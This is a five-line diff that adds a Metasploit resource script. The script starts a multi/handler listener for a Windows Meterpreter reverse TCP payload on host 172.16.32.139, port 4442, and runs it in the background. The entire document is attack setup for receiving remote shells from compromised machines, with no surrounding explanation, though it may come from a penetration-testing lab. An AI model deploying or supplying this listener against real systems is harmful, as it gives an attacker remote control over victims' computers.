@@ -1,0 +1,5 @@
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 172.16.32.139
+set lport 4442
+exploit -z
